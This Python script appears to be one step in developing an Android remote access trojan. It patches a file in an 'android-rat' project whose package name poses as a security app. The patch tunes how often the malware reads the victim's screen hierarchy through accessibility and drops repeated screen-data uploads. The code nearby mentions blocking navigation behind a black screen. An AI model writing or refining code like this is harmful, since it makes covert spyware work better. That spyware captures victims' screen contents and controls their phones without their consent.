J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
s = open(J, encoding="utf-8").read()
assert "lastHierJson" not in s, "ya parcheado"

o1 = "                    screenReaderHandler.postDelayed(this, 80);"
assert s.count(o1) == 1
s = s.replace(o1, "                    screenReaderHandler.postDelayed(this, 250); // [KRYPTOS-PATCH PERF] era 80ms (12.5/s)")

o2 = "    private static final long BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 1200;"
assert s.count(o2) == 1
s = s.replace(o2, o2 + "\n    private String lastHierJson = \"\";\n    private long lastHierSentMs = 0L;")

o3 = "            sendScreenHierarchy(json.toString());"
assert s.count(o3) == 1
s = s.replace(o3, "            String _hj = json.toString();\n            long _now = System.currentTimeMillis();\n            if (_hj.equals(lastHierJson) && (_now - lastHierSentMs) < 2000L) return;\n            lastHierJson = _hj;\n            lastHierSentMs = _now;\n            sendScreenHierarchy(_hj);")

open(J, "w", encoding="utf-8").write(s)
print("PASO 4 OK")
